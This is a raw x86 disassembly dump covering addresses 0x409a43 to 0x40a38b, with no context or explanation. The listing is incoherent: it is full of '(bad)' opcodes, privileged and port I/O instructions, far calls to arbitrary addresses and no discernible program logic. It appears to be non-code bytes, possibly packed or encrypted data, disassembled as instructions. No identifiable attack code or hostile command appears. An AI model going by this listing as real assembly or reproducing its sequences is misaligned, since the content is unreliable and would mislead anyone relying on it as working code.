  409a43:	sbb    BYTE PTR [ecx],0x9b
  409a46:	adc    bh,bh
  409a48:	shl    DWORD PTR [esi-0x6f],cl
  409a4b:	sldt   WORD PTR [eax]
	...
  409a5e:	add    BYTE PTR [eax],al
  409a60:	retf   
  409a61:	dec    edx
  409a62:	fwait
  409a63:	test   esp,esp
  409a65:	test   DWORD PTR [eax],ebp
  409a67:	call   FWORD PTR [ebx+edx*4-0x7a]
  409a6b:	popf   
  409a6c:	mov    bl,0x7d
  409a6e:	and    al,0x14
  409a70:	xchg   edi,eax
  409a71:	cmp    edx,DWORD PTR [ecx-0x579cc3fb]
  409a77:	pushf  
  409a78:	fwait
  409a79:	gs inc eax
  409a7b:	test   DWORD PTR [ebp+eiz*2+0x7da1ff28],esi
  409a82:	or     al,BYTE PTR [eax]
  409a84:	adc    ecx,esi
  409a86:	cmp    al,0xf7
  409a88:	jnp    0x409acd
  409a8a:	mov    ebp,0xc99a2967
  409a8f:	jmp    FWORD PTR [edx-0x6b]
  409a92:	push   esp
  409a93:	adc    al,0x5b
  409a95:	mov    WORD PTR [edi-0x78671edf],ss
  409a9b:	xchg   ebp,eax
  409a9c:	repz mov eax,DWORD PTR [edi+0x7761118b]
  409aa3:	and    DWORD PTR [ebx+0x18],eax
  409aa6:	xor    eax,0x7f8c4328
  409aab:	add    al,0x83
  409aad:	adc    BYTE PTR [ebx+0x4],bl
  409ab0:	mov    WORD PTR [edx+eiz*2+0x5784305f],ss
  409ab7:	and    DWORD PTR [ebx+ebx*4-0x6b736d9d],ecx
  409abe:	fild   WORD PTR [ecx+ecx*2+0x21377d]
	...
  409ad5:	add    BYTE PTR [eax],al
  409ad7:	add    BYTE PTR [ebx],al
  409ad9:	xchg   ebp,eax
  409ada:	out    0x87,al
  409adc:	or     eax,0x6403df95
  409ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ae2:	fbstp  TBYTE PTR [eax]
  409ae4:	sub    cl,BYTE PTR [ebp+edx*4-0x76990bf5]
  409aeb:	and    ebx,ebx
  409aed:	mov    edx,DWORD PTR [ebp+0x30]
  409af0:	fisttp DWORD PTR [ebx-0x63bedef9]
  409af6:	pop    ss
  409af7:	jmp    0x7d01:0x20f78c25
  409afe:	mul    DWORD PTR [eax]
  409b00:	mov    bl,0x8b
  409b02:	jge    0x409b0f
  409b04:	mov    ah,0xac
  409b06:	mov    DWORD PTR [eax],esp
  409b08:	mov    ds:0xa3279d8b,eax
  409b0d:	mov    ebx,edi
  409b0f:	and    BYTE PTR [ecx],bl
  409b11:	pushf  
  409b12:	(bad)  
  409b13:	or     eax,0x20cf8b26
  409b18:	cmp    DWORD PTR [edi+edi*4+0x20],ebp
  409b1c:	jnp    0x409aa9
  409b1e:	or     DWORD PTR [eax+eax*4],edi
  409b21:	jl     0x409ab6
  409b23:	push   eax
  409b24:	lods   al,BYTE PTR ds:[esi]
  409b25:	mov    esi,esi
  409b27:	pop    esp
  409b28:	mov    ds:0xac9ef683,eax
  409b2d:	add    DWORD PTR [ecx],eax
  409b2f:	sbb    DWORD PTR [ebp+0x108ef62d],0x6c7edd49
  409b39:	mov    ecx,DWORD PTR [ecx]
  409b3b:	cmc    
	...
  409b50:	cmp    BYTE PTR [esi],dl
  409b52:	mov    ah,0x99
  409b54:	xchg   esp,eax
  409b55:	mov    esi,esi
  409b57:	in     eax,0x2
  409b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b5a:	sub    DWORD PTR [ebx+ebx*2-0x7d],0xc46c5ef6
  409b62:	cmc    
  409b63:	fadd   QWORD PTR [edi-0x538f9c84]
  409b69:	mov    esp,edx
  409b6b:	repz xor DWORD PTR [ebx+0x7c87b4f7],ecx
  409b72:	push   edi
  409b73:	push   eax
  409b74:	lods   al,BYTE PTR ds:[esi]
  409b75:	mov    esi,esi
  409b77:	je     0x409b2c
  409b79:	xor    esi,0x26
  409b7c:	mov    bh,0x36
  409b7e:	xchg   ebp,eax
  409b7f:	push   ds
  409b80:	lods   al,BYTE PTR ds:[esi]
  409b81:	mov    edi,DWORD PTR [ebp+eax*1+0x1f68b74]
  409b88:	inc    esp
  409b89:	sub    dh,dh
  409b8b:	push   es
  409b8c:	ins    BYTE PTR es:[edi],dx
  409b8d:	inc    ecx
  409b8e:	loope  0x409b86
  409b90:	fwait
  409b91:	mov    esp,ecx
  409b93:	xor    ecx,DWORD PTR gs:[ebx+0x6841eef6]
  409b9a:	(bad)  
  409b9b:	out    0x83,al
  409b9d:	jl     0x409b27
  409b9f:	jge    0x409c1c
  409ba1:	mov    esi,esi
  409ba3:	pushf  
  409ba4:	push   esp
  409ba5:	xor    esi,0xffffffce
  409ba8:	mov    eax,0x4a009502
  409bad:	stos   BYTE PTR es:[edi],al
  409bae:	cmc    
  409baf:	mov    ch,0x35
  409bb1:	mov    ds:0xfff5,al
	...
  409bc6:	add    BYTE PTR [eax],al
  409bc8:	cmp    ch,BYTE PTR [edx+eax*1]
  409bcb:	jmp    DWORD PTR [eax+0x28b9e098]
  409bd1:	stos   BYTE PTR es:[edi],al
  409bd2:	cmc    
  409bd3:	inc    eax
  409bd5:	mov    al,ds:0xb8fafffd
  409bda:	push   edx
  409bdb:	pushf  
  409bdc:	sbb    ch,BYTE PTR [edx-0x47f2ba0b]
  409be2:	ret    
  409be3:	std    
  409be4:	mov    edx,0xb975f5a9
  409be9:	mov    eax,0x9635887e
  409bee:	mov    edi,0x5b9619c2
  409bf3:	mov    ecx,ecx
  409bf5:	adc    eax,0x964ffccd
  409bfa:	bound  ebx,QWORD PTR [edx+ebx*2]
  409bfd:	sub    ecx,DWORD PTR [esi]
  409bff:	call   0x36a4dd
  409c04:	jl     0x409c61
  409c06:	repnz push 0x495475
  409c0c:	mov    edx,0x3448de6b
  409c11:	xchg   esi,eax
  409c12:	cmc    
  409c13:	jne    0x409bf2
  409c15:	mov    ebp,0xa97afd7a
  409c1a:	pusha  
  409c1b:	mov    al,0xf9
  409c1d:	push   eax
  409c1e:	mul    BYTE PTR [edi-0x49]
  409c21:	xchg   ebp,eax
  409c22:	or     BYTE PTR [eax-0x17f1d346],al
  409c28:	add    eax,0xfff5b5
	...
  409c3d:	add    BYTE PTR [eax],al
  409c3f:	add    BYTE PTR [edx+0x40fff22c],bh
  409c45:	cwde   
  409c46:	loopne 0x409cc7
  409c48:	or     al,0xab
  409c4a:	cmc    
  409c4b:	leave  
  409c4c:	mov    WORD PTR ds:0xf6e1000e,?
  409c52:	and    eax,0x14474881
  409c57:	(bad)  
  409c58:	jnp    0x409c3f
  409c5a:	or     al,0x6a
  409c5c:	xchg   ecx,eax
  409c5d:	inc    edx
  409c5e:	xchg   ecx,eax
  409c5f:	pop    es
  409c60:	je     0x409bfd
  409c62:	jae    0x409c63
  409c64:	arpl   WORD PTR [ecx+eax*8],ax
  409c67:	sti    
  409c68:	in     al,0x6f
  409c6a:	or     eax,0x80f08c00
  409c6f:	test   DWORD PTR [edx+0x1a],0x89345017
  409c76:	pop    DWORD PTR [eax]
  409c78:	mov    WORD PTR [esi+0x4060744a],es
  409c7e:	push   cs
  409c7f:	add    DWORD PTR [ebx+edi*2-0x3c4bdb61],ecx
  409c86:	mov    ch,0x40
  409c88:	mov    eax,?
  409c8a:	xor    bh,0x12
  409c8d:	loop   0x409ca5
  409c8f:	push   eax
  409c90:	hlt    
  409c91:	inc    ecx
  409c92:	ja     0x409c93
  409c94:	add    ebp,DWORD PTR [ebx]
  409c96:	mov    ds:0x53d9fbff,al
  409c9b:	push   eax
  409c9c:	repz inc edi
  409c9e:	add    ch,al
  409ca0:	and    bh,BYTE PTR [esi+edx*1+0xff]
	...
  409cb7:	add    ah,dh
  409cb9:	(bad)  
  409cba:	jb     0x409cbb
  409cbc:	fld    TBYTE PTR [ecx+0x27d3fb90]
  409cc2:	add    ch,al
  409cc4:	mov    ds:0xd5ff1704,eax
  409cc9:	mov    esp,0x661000d
  409cce:	es or  eax,0x7e
  409cd2:	mov    eax,ds:0x175935ff
  409cd7:	jne    0x409c6d
  409cd9:	xchg   esp,eax
  409cda:	xlat   BYTE PTR ds:[ebx]
  409cdb:	pop    ecx
  409cdc:	hlt    
  409cdd:	mov    bh,dl
  409cdf:	mov    ecx,DWORD PTR [ecx-0x78]
  409ce2:	dec    eax
  409ce3:	add    al,0x8c
  409ce5:	ja     0x409c6d
  409ce7:	lods   al,BYTE PTR ds:[esi]
  409ce8:	pop    ecx
  409ce9:	jmp    0x7324a10e
  409cee:	adc    al,0xc3
  409cf0:	jae    0x409c79
  409cf2:	xor    eax,0xac2f740c
  409cf7:	sbb    eax,0x20158863
  409cfc:	pop    ebx
  409cfd:	add    bh,al
  409cff:	sub    esi,DWORD PTR [eax]
  409d01:	sub    eax,0x53551d9f
  409d06:	in     al,dx
  409d07:	add    ebx,ecx
  409d09:	sbb    ebx,DWORD PTR [ebx+eax*4+0x1d7f6150]
  409d10:	xor    ebx,DWORD PTR [edx]
  409d12:	and    eax,0xfd87bc20
  409d17:	repz and al,BYTE PTR [edx]
  409d1a:	cld    
  409d1b:	sub    eax,DWORD PTR [eax]
	...
  409d2d:	add    BYTE PTR [eax],al
  409d2f:	add    BYTE PTR [eax-0x78fc1ff1],ah
  409d35:	push   esp
  409d36:	out    dx,eax
  409d37:	xchg   BYTE PTR [eax],al
  409d39:	xchg   esi,eax
  409d3a:	fild   WORD PTR [ebx]
  409d3c:	retf   
  409d3d:	rol    DWORD PTR [edi+0x4],1
  409d40:	mov    WORD PTR [edi+ebx*8+0x3f804944],ss
  409d47:	add    eax,0x3c9948c
  409d4c:	jbe    0x409ce2
  409d4e:	cdq    
  409d4f:	add    esp,DWORD PTR [esi-0x6c]
  409d52:	fs (bad) 
  409d54:	(bad)  
  409d56:	ins    BYTE PTR es:[edi],dx
  409d57:	xchg   eax,eax
  409d59:	jg     0x409d62
  409d5b:	sbb    eax,0x1b75875c
  409d60:	mov    ebx,0x4a2bf401
  409d65:	wbinvd 
  409d67:	jmp    0x760938fb
  409d6c:	mov    bh,BYTE PTR [ebp-0x42]
  409d6f:	call   0x95a13203
  409d74:	(bad)  
  409d75:	aam    0x8
  409d77:	(bad)  
  409d78:	and    dl,BYTE PTR [edi-0x77fe8920]
  409d7e:	neg    BYTE PTR [ecx]
  409d80:	add    eax,0x9b648464
  409d85:	jg     0x409d7d
  409d87:	mov    dh,0x1f
  409d89:	in     eax,0xe0
  409d8b:	data16 loope 0x409d15
  409d8e:	div    BYTE PTR [eax+0x12]
  409d91:	test   dh,bh
  409d93:	sahf   
	...
  409da8:	jo     0x409e26
  409daa:	aam    0x73
  409dac:	test   al,0x87
  409dae:	test   BYTE PTR [edi+ebp*2+0x7f],ah
  409db2:	test   BYTE PTR [esi+0x1de4eeff],0x4f
  409db9:	xchg   edi,esi
  409dbb:	cmp    al,0x7f
  409dbd:	jg     0x409db5
  409dbf:	outs   dx,BYTE PTR ds:[esi]
  409dc0:	add    BYTE PTR [ecx],0x5
  409dc3:	push   ecx
  409dc4:	push   esp
  409dc5:	sub    esi,esi
  409dc7:	pop    esi
  409dc8:	push   es
  409dc9:	adc    ebp,ebp
  409dcb:	pop    esi
  409dcc:	test   al,0x87
  409dce:	arpl   cx,bp
  409dd0:	aaa    
  409dd1:	adc    BYTE PTR [ebp-0x58],0x8f
  409dd5:	xchg   DWORD PTR [ecx+edi*1+0x36f68798],edi
  409ddc:	add    bl,BYTE PTR [ebx-0x789dd620]
  409de2:	div    BYTE PTR [eax+0x12]
  409de5:	js     0x409de5
  409de7:	push   ds
  409de8:	jo     0x409de4
  409dea:	or     BYTE PTR [ecx-0x16b8175a],al
  409df0:	mov    al,ds:0xba00f941
  409df5:	stos   BYTE PTR es:[edi],al
  409df6:	cmc    
  409df7:	(bad)  
  409df8:	cmp    BYTE PTR [edi-0x57bf5a20],dl
  409dfe:	cmc    
  409dff:	mov    DWORD PTR [eax],ebp
  409e01:	mov    ebx,0x35b2fffd
  409e06:	mul    BYTE PTR [edi-0x59]
  409e09:	dec    ebx
  409e0a:	dec    ecx
	...
  409e1f:	add    BYTE PTR [edx-0x1c],ah
  409e22:	clc    
  409e23:	not    DWORD PTR [edx-0x56]
  409e26:	cmc    
  409e27:	jne    0x409daa
  409e29:	mov    edx,0xaa329d82
  409e2e:	jg     0x409db5
  409e30:	add    DWORD PTR [edx-0x6f30000b],esp
  409e36:	pusha  
  409e37:	adc    al,dl
  409e39:	dec    edi
  409e3a:	idiv   dh
  409e3c:	mov    eax,0x22fffda0
  409e41:	stos   BYTE PTR es:[edi],al
  409e42:	jnp    0x409e50
  409e44:	or     eax,0x12ff953a
  409e49:	sbb    BYTE PTR [eax+ebx*8+0x6af5a9ba],cl
  409e50:	xor    eax,0x745d423a
  409e55:	nop
  409e56:	cmc    
  409e57:	mov    ch,0xb5
  409e59:	mov    eax,ds:0x23b2fff5
  409e5e:	add    ch,al
  409e60:	dec    ecx
  409e61:	or     eax,0x136cfff6
  409e66:	(bad)  
  409e68:	push   edx
  409e69:	test   eax,0xa149bd89
  409e6e:	cmc    
  409e6f:	push   ebp
  409e71:	adc    eax,0xbc708371
  409e76:	std    
  409e77:	push   DWORD PTR [edx+0x66707c90]
  409e7d:	jmp    0x409e5f
  409e7f:	test   DWORD PTR [esi+ebx*4+0x11],0x0
	...
  409e96:	add    BYTE PTR [eax],al
  409e98:	cmp    BYTE PTR [esi],cl
  409e9a:	mov    ds:0x529e8c0f,al
  409e9f:	(bad)  
  409ea0:	cmp    DWORD PTR [ebx+0x7f02bf22],eax
  409ea6:	adc    edi,edi
  409ea8:	fld    DWORD PTR [edi+0x6e9bff1b]
  409eae:	cdq    
  409eaf:	pop    es
  409eb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409eb1:	mov    bh,BYTE PTR [ebx-0x1]
  409eb4:	mov    ebx,DWORD PTR [esi+0x59]
  409eb7:	call   0xff53f537
  409ebc:	add    DWORD PTR [edx+eiz*1+0x13461b05],eax
  409ec3:	jmp    DWORD PTR [ecx]
  409ec5:	pop    ebx
  409ec6:	sbb    edi,edi
  409ec8:	arpl   WORD PTR [esi],si
  409eca:	pop    ecx
  409ecb:	in     al,0x63
  409ecd:	cs adc edi,edi
  409ed0:	fld    DWORD PTR [ebx+0x1e22c522]
  409ed6:	adc    edi,edi
  409ed8:	stc    
  409ed9:	inc    edx
  409eda:	sbb    edi,edi
  409edc:	cmp    ecx,DWORD PTR [esi]
  409ede:	cdq    
  409edf:	pop    es
  409ee0:	and    al,0x1a
  409ee2:	js     0x409ee3
  409ee4:	sub    edi,esi
  409ee6:	pop    eax
  409ee7:	fcomp  QWORD PTR [ebx]
  409ee9:	not    BYTE PTR [edx]
  409eeb:	jmp    DWORD PTR [ecx-0x52add7d]
  409ef1:	in     eax,0x12
  409ef3:	inc    DWORD PTR [ecx-0x39]
  409ef6:	sbb    bh,bh
  409ef8:	add    edx,esi
  409efa:	cwde   
  409efb:	pop    es
	...
  409f10:	in     al,0xb5
  409f12:	ja     0x409f13
  409f14:	repz lds ebx,FWORD PTR [eax-0x1c]
  409f18:	jecxz  0x409ed7
  409f1a:	adc    ch,al
  409f1c:	xor    eax,0xdbff12e4
  409f21:	xchg   ebx,eax
  409f22:	push   esp
  409f23:	daa    
  409f24:	fild   DWORD PTR [edi+edx*1+0x1f2b2a2b]
  409f2b:	sbb    al,bl
  409f2d:	or     BYTE PTR ds:[edx],dl
  409f30:	mov    ebx,0x15761884
  409f35:	test   edi,esi
  409f37:	sbb    ecx,esp
  409f39:	neg    DWORD PTR [bx+di]
  409f3c:	mov    ds:0x9b7c687b,eax
  409f41:	test   bh,ch
  409f43:	dec    edi
  409f44:	mov    ah,0x7c
  409f46:	xlat   BYTE PTR ds:[ebx]
  409f47:	sbb    DWORD PTR [edx+eax*1+0x79],esi
  409f4b:	sbb    DWORD PTR [ebx-0x7ccf627c],eax
  409f51:	test   bh,cl
  409f53:	sub    al,0xfe
  409f55:	sbb    eax,0x4a6b19b7
  409f5a:	mov    al,0x11
  409f5c:	arpl   WORD PTR [edi+eiz*4+0x1583878f],ax
  409f63:	or     al,0x64
  409f65:	pushf  
  409f66:	xchg   ebp,eax
  409f67:	sbb    DWORD PTR [ebx-0x7c],ecx
  409f6a:	push   ebp
  409f6b:	adc    al,0x3b
  409f6d:	test   BYTE PTR [edi-0x70e21dd4],al
  409f73:	sbb    DWORD PTR [eax],eax
	...
  409f85:	add    BYTE PTR [eax],al
  409f87:	add    BYTE PTR [ebx],dh
  409f89:	fiadd  DWORD PTR [edi+0x7f82872b]
  409f8f:	sbb    DWORD PTR [ebx],esp
  409f91:	or     ah,BYTE PTR [esp+ebp*1-0x62]
  409f95:	sbb    eax,esp
  409f97:	add    eax,DWORD PTR [ebp+0x57]
  409f9a:	in     al,0x3
  409f9c:	popa   
  409f9d:	cmovl  eax,DWORD PTR [ebp+0x3ca80c8]
  409fa4:	mov    ds:0x6c8b8f4e,ax
  409faa:	fdiv   DWORD PTR [ecx-0x15]
  409fad:	or     DWORD PTR [ecx],0x60
  409fb0:	and    eax,DWORD PTR [eax-0x2add2b9f]
  409fb6:	or     BYTE PTR [esi],ah
  409fb8:	ret    
  409fb9:	imul   eax,DWORD PTR [ecx-0x58],0xffffff8f
  409fbd:	cmp    DWORD PTR [ecx+eiz*8+0x77],0x54
  409fc2:	hlt    
  409fc3:	push   cs
  409fc4:	xchg   ebp,eax
  409fc5:	in     al,dx
  409fc6:	sbb    esp,DWORD PTR [esi+ecx*8-0x7014917d]
  409fcd:	xchg   esp,eax
  409fce:	mov    dh,dh
  409fd0:	adc    bl,BYTE PTR [eax+eiz*8-0x97c7cc1]
  409fd7:	out    0x2,al
  409fd9:	xor    dh,0x54
  409fdc:	cwde   
  409fdd:	ins    BYTE PTR es:[edi],dx
  409fde:	jb     0x40a05f
  409fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe1:	add    eax,0xffffffab
  409fe4:	jnp    0x409f69
  409fe6:	pop    ebp
  409fe7:	jb     0x409f94
  409fe9:	pop    ss
  409fea:	int    0xbd
	...
  40a000:	sbb    eax,0x31e962ea
  40a005:	mov    ds:0x6c8834f5,eax
  40a00a:	adc    al,0x7f
  40a00c:	je     0x409f91
  40a00e:	and    BYTE PTR [esp+eiz*4],0xf
  40a012:	cmp    al,0x35
  40a014:	push   eax
  40a015:	aam    0x8
  40a017:	bound  esp,QWORD PTR [edx-0x1d]
  40a01a:	inc    eax
  40a01b:	sub    BYTE PTR [eax+0x1be93614],cl
  40a021:	hlt    
  40a022:	pusha  
  40a023:	or     bl,bl
  40a025:	ror    DWORD PTR [eax],cl
  40a027:	pop    ss
  40a028:	push   0x8fe98bbe
  40a02d:	in     al,0x60
  40a02f:	mov    dh,0x42
  40a031:	aam    0x8
  40a033:	mov    esi,0xe98bb2b7
  40a038:	(bad)  
  40a039:	fiadd  WORD PTR [ecx]
  40a03b:	add    BYTE PTR [ebp-0x78f4f5ee],ah
  40a041:	adc    esp,DWORD PTR [eax]
  40a043:	push   esi
  40a044:	dec    ebp
  40a045:	sub    ch,BYTE PTR [eax+0x672faaff]
  40a04b:	pop    ebp
  40a04c:	and    al,0x97
  40a04e:	pop    eax
  40a04f:	call   0x36ab9a
  40a054:	add    eax,0xbafff62f
  40a059:	(bad)  [eax+0x6a]
  40a05c:	call   0xaa9096b6
  40a061:	adc    BYTE PTR [esi],cl
  40a063:	call   0x40a068
	...
  40a078:	sbb    edx,esi
  40a07a:	cmc    
  40a07b:	dec    DWORD PTR [ebp-0x55006eec]
  40a081:	scas   al,BYTE PTR es:[edi]
  40a082:	pop    es
  40a083:	inc    esi
  40a084:	cmc    
  40a085:	push   0xfffffff6
  40a087:	je     0x40a0e8
  40a089:	inc    ebx
  40a08a:	repnz xor esp,DWORD PTR ds:0x4afff5e0
  40a091:	stos   BYTE PTR es:[edi],al
  40a092:	cli    
  40a093:	scas   al,BYTE PTR es:[edi]
  40a094:	lea    eax,[ecx+0x241a9f7d]
  40a09a:	bnd jmp DWORD PTR [eax-0x2f1c1f70]
  40a0a1:	test   eax,0xcf8b5ff5
  40a0a6:	retf   0x3504
  40a0a9:	inc    ebp
  40a0aa:	sub    esp,0xffffffa6
  40a0ad:	aam    0xf4
  40a0af:	push   DWORD PTR [eax]
  40a0b1:	call   0x92f2:0xae1d75f5
  40a0b8:	call   0x7ba9:0xa9457fa9
  40a0bf:	cld    
  40a0c0:	stos   BYTE PTR es:[edi],al
  40a0c1:	and    ecx,DWORD PTR [esi]
  40a0c3:	call   0x36a697
  40a0c8:	mov    esi,?
  40a0ca:	mov    edi,0x98ab870b
  40a0cf:	inc    ecx
  40a0d0:	setne  BYTE PTR [esp+esi*2]
  40a0d4:	test   eax,0xf4fb97c2
  40a0d9:	cs jb  0x40a0db
	...
  40a0f0:	fistp  DWORD PTR [ebx]
  40a0f2:	pop    ds
  40a0f3:	jne    0x40a075
  40a0f5:	mov    edx,0xa25cfb97
  40a0fa:	xchg   edi,eax
  40a0fb:	pop    es
  40a0fc:	mov    ah,0xcd
  40a0fe:	jp     0x40a0ff
  40a100:	mov    ebx,0x804d8345
  40a105:	out    dx,al
  40a106:	sar    edi,cl
  40a108:	and    BYTE PTR [ebp-0x1c6e1848],al
  40a10e:	sbb    eax,0x21ab67ff
  40a113:	adc    al,0xf
  40a115:	stc    
  40a116:	cld    
  40a117:	(bad)  
  40a118:	inc    DWORD PTR [ebx+0x6a9c4583]
  40a11e:	cdq    
  40a11f:	sti    
  40a120:	or     ebp,DWORD PTR [ebx-0x7d]
  40a123:	ret    0x6d67
  40a126:	jecxz  0x40a0e7
  40a128:	push   ebp
  40a129:	sub    eax,0xf6b9000e
  40a12e:	sub    eax,0x1f5fe1ff
  40a133:	jne    0x40a0b9
  40a135:	and    ecx,DWORD PTR [edi+0x1f224b92]
  40a13b:	jne    0x40a0cd
  40a13d:	mov    ebx,0x1384751d
  40a142:	not    DWORD PTR [edx-0x3dbae5cd]
  40a148:	xchg   esp,eax
  40a149:	imul   edi,DWORD PTR [ecx+0x35ee308a],0xffffffc0
  40a150:	ret    0xb9aa
  40a153:	add    BYTE PTR [eax],0x0
	...
  40a166:	add    BYTE PTR [eax],al
  40a168:	xchg   ecx,eax
  40a169:	xchg   esp,eax
  40a16a:	test   DWORD PTR [ebx],0x9862a680
  40a170:	xchg   edi,eax
  40a171:	xchg   esp,eax
  40a172:	rol    DWORD PTR [edi],cl
  40a174:	ud0    ebp,edi
  40a177:	add    edi,DWORD PTR [eax-0x66]
  40a17a:	bound  ebx,QWORD PTR [eax+0xcbc947f]
  40a180:	mov    bh,0x54
  40a182:	fwait
  40a183:	mov    dh,0x39
  40a185:	dec    ebx
  40a186:	and    dh,bl
  40a188:	ror    DWORD PTR ds:0x740f07a5,cl
  40a18e:	out    dx,eax
  40a18f:	add    BYTE PTR [ecx-0x70],0xdf
  40a193:	(bad)  
  40a194:	(bad)  
  40a195:	lea    ebx,[edi]
  40a197:	pop    DWORD PTR [ebp+ebp*4-0x1db545e1]
  40a19e:	cmp    BYTE PTR [ecx+0x7c],al
  40a1a1:	xchg   esp,eax
  40a1a2:	push   0xffffffc0
  40a1a4:	jg     0x40a1bb
  40a1a6:	add    dh,bh
  40a1a8:	push   cs
  40a1a9:	push   ebx
  40a1ab:	add    eax,DWORD PTR [eax]
  40a1ad:	cdq    
  40a1ae:	cli    
  40a1af:	inc    ebx
  40a1b0:	clc    
  40a1b1:	lea    ecx,[edx]
  40a1b3:	inc    esp
  40a1b4:	xlat   BYTE PTR ds:[ebx]
  40a1b5:	fbld   TBYTE PTR ds:0xdfa54e4b
  40a1bb:	call   0x87e2206
  40a1c0:	adc    ebx,edx
  40a1c2:	lahf   
  40a1c3:	adc    ecx,0xd914eb54
  40a1c9:	push   esp
  40a1ca:	cwde   
  40a1cb:	call   0x0:0x0
	...
  40a1de:	add    BYTE PTR [eax],al
  40a1e0:	and    al,BYTE PTR [eax-0x25eae769]
  40a1e6:	mov    ds:0x4658b989,eax
  40a1eb:	fwait
  40a1ec:	rcl    ch,1
  40a1ee:	fistp  WORD PTR [edx-0x69]
  40a1f1:	xchg   esp,eax
  40a1f2:	fild   WORD PTR [ebx]
  40a1f4:	pop    ds
  40a1f5:	cmp    DWORD PTR [ecx],ecx
  40a1f7:	bound  ecx,QWORD PTR [ebx]
  40a1f9:	cwde   
  40a1fa:	sbb    DWORD PTR [esp+eax*4],0x4b74ad83
  40a201:	jo     0x40a25c
  40a203:	pop    esi
  40a204:	adc    eax,DWORD PTR [eax-0xa]
  40a207:	fdivr  QWORD PTR [ebx-0x66778194]
  40a20d:	jg     0x40a205
  40a20f:	mov    esp,0x56386cab
  40a214:	jns    0x40a295
  40a216:	idiv   BYTE PTR [ebx+edx*4+0xd294c0f]
  40a21d:	fcmove st,st(0)
  40a21f:	add    ah,BYTE PTR [ecx-0x2dee36f7]
  40a225:	not    BYTE PTR es:[esi]
  40a228:	pop    es
  40a229:	fcmove st,st(4)
  40a22b:	or     eax,0x74ccda07
  40a230:	sbb    esi,DWORD PTR [eax-0x7e]
  40a233:	jl     0x40a298
  40a235:	cmp    eax,0x948fe919
  40a23a:	stc    
  40a23b:	inc    ebp
  40a23c:	cmp    bh,ch
  40a23e:	push   ebx
  40a23f:	sub    BYTE PTR [eax+0xe9023d],dl
	...
  40a255:	add    BYTE PTR [eax],al
  40a257:	add    BYTE PTR [edi+0x48df994],cl
  40a25d:	or     DWORD PTR [ecx],eax
  40a25f:	bound  ecx,QWORD PTR [edx-0x75]
  40a262:	stc    
  40a263:	lea    edx,[edx]
  40a265:	fld1   
  40a267:	sbb    DWORD PTR [ecx+0x9],edi
  40a26a:	leave  
  40a26b:	mov    dh,0xa
  40a26d:	push   ebx
  40a26e:	loope  0x40a277
  40a270:	out    dx,eax
  40a271:	jg     0x40a269
  40a273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a274:	sbb    dl,BYTE PTR [ebx-0x1f]
  40a277:	mov    DWORD PTR [ecx+0x1295f67f],esi
  40a27d:	or     ecx,edi
  40a27f:	pop    esp
  40a280:	sbb    dl,BYTE PTR [edi-0x50]
  40a283:	add    BYTE PTR [ebp-0x6d],al
  40a286:	or     BYTE PTR [eax],al
  40a288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a289:	fild   WORD PTR [ebx+0xda0575]
  40a28f:	add    BYTE PTR ds:0xdfa4f993,ah
  40a295:	xchg   ecx,eax
  40a296:	add    DWORD PTR [ebp-0x43],0x43
  40a29a:	out    dx,al
  40a29b:	push   0x8b089307
  40a2a0:	fadd   DWORD PTR [edx-0x2e36827d]
  40a2a6:	in     eax,0x3
  40a2a8:	fisub  WORD PTR [edi-0x67b19884]
  40a2ae:	add    DWORD PTR [ebp+0x4d],0x43
  40a2b2:	pop    esp
  40a2b3:	push   esi
  40a2b4:	popf   
  40a2b5:	call   0x8cf:0x13b500ac
	...
  40a2d0:	repnz mov esi,ebp
  40a2d3:	jne    0x40a285
  40a2d5:	xchg   edx,eax
  40a2d6:	mov    esi,0xf1149246
  40a2db:	or     BYTE PTR [edx],bl
  40a2dd:	xchg   ebp,eax
  40a2de:	and    eax,esi
  40a2e0:	into   
  40a2e1:	or     eax,0x2b93d106
  40a2e6:	imul   BYTE PTR [ecx+0x75]
  40a2e9:	and    dh,dh
  40a2eb:	imul   esi,DWORD PTR [ebp+0x3c],0x207575f7
  40a2f2:	imul   BYTE PTR [ecx+0x65]
  40a2f5:	call   0xc001:0x927581b6
  40a2fc:	cdq    
  40a2fd:	pop    edi
  40a2fe:	inc    esi
  40a2ff:	push   eax
  40a300:	dec    ebp
  40a301:	pop    ss
  40a302:	lahf   
  40a303:	jmp    DWORD PTR [edx]
  40a305:	(bad)  
  40a306:	rcr    BYTE PTR [ecx-0x61],1
  40a309:	cwde   
  40a30a:	bound  eax,QWORD PTR [eax]
  40a30c:	test   BYTE PTR [ebp+0x5c],al
  40a30f:	dec    DWORD PTR [eax+eiz*4-0x6e739604]
  40a316:	or     al,0xe8
  40a318:	or     ebp,ebp
  40a31a:	or     al,0x0
  40a31c:	xchg   edi,eax
  40a31d:	sub    edx,DWORD PTR [eax-0x49ec40f9]
  40a323:	xchg   ebp,eax
  40a324:	adc    ebp,edi
  40a326:	aad    0xda
  40a328:	pop    ss
  40a329:	stos   DWORD PTR es:[edi],eax
  40a32a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a32b:	pop    esi
  40a32c:	(bad)  
  40a32d:	les    ecx,FWORD PTR [esi+0x10]
  40a330:	mov    WORD PTR [eax+0x77],es
  40a333:	in     al,dx
	...
  40a348:	(bad)  
  40a34a:	sbb    al,0x57
  40a34c:	aas    
  40a34d:	mov    ds:0x6f59ff25,al
  40a352:	sbb    esi,DWORD PTR [ebp-0x7c]
  40a355:	shl    DWORD PTR [ecx],cl
  40a357:	nop
  40a358:	shr    DWORD PTR [esi-0x7cbe0144],cl
  40a35e:	adc    cl,BYTE PTR [esi+ebx*1-0x4b74e661]
  40a365:	inc    ebx
  40a366:	psubb  mm0,QWORD PTR [edi+0x194690ab]
  40a36d:	xor    DWORD PTR [esi],ebx
  40a36f:	push   eax
  40a370:	mov    ds:0x21fef608,eax
  40a375:	jae    0x40a389
  40a377:	stos   DWORD PTR es:[edi],eax
  40a378:	xchg   ecx,eax
  40a379:	outs   dx,BYTE PTR ds:[esi]
  40a37a:	sbb    ecx,DWORD PTR [ecx+0x458977d1]
  40a380:	jl     0x40a33d
  40a382:	sbb    DWORD PTR [ebp-0x78],esi
  40a385:	xchg   cx,ax
  40a387:	pop    es
  40a388:	fs add al,0x19
  40a38b:	jmp    FWORD PTR [ebx+0x4]
